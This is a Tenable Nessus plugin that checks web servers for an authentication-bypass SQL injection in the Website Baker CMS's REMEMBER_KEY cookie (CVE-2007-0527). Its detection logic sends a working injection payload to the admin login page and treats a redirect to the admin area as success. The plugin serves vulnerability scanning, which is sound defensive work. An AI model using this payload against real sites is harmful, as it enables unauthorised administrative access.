#
# (C) Tenable Network Security
#

include("compat.inc");

if (description)
{
  script_id(24235);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2007-0527");
  script_bugtraq_id(22176);
  script_osvdb_id(32945);

  script_name(english:"Website Baker REMEMBER_KEY Cookie SQL Injection");
  script_summary(english:"Tries to bypass authentication with Website Baker");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Website Baker, a PHP-based content
management system. 

The installed version of Website Baker fails to validate input to the
'REMEMBER_KEY' cookie before using it in 'framework/class.login.php'
to construct SQL queries.  Provided PHP's 'magic_quotes_gpc' setting
is disabled, an unauthenticated, remote attacker can leverage this
issue to manipulate database queries, possibly to gain administrative
access to the application or launch other sorts of SQL injection
attacks against the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/457684/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/01/23");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/01/22");
 script_cvs_date("$Date: 2016/05/04 18:02:23 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq("/wb", cgi_dirs());
else dirs = make_list(cgi_dirs());

# the cookie line is malformed, I prefer not to use the cookie jar
disable_cookiejar();

foreach dir (dirs)
{
  # Check whether the affected script exists.
  url = string(dir, "/admin/login/index.php");
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if (
    ">Website Baker<" >< r[2] &&
    'input type="hidden" name="username_fieldname"' >< r[2]
  )
  {
    # Try to exploit the flaw to bypass authentication.
    exploit = "REMEMBER_KEY=00000000001_' or user_id='1";
    postdata = string(
      "remember=true&",
      "submit=Login"
    );
    r = http_send_recv3(method: "POST", item: url, version: 11, 
  data: postdata, port: port,
  add_headers: make_array("Cookie", exploit,
      "Content-Type", "application/x-www-form-urlencoded") );
    if (isnull(r)) exit(0);

    # There's a problem if we're redirected to the admin start page.
    if (
      "REMEMBER_KEY=" >< r[1]+r[2] &&
      egrep(pattern:"^Location: .+admin/start", string:r[1])
    )
    {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
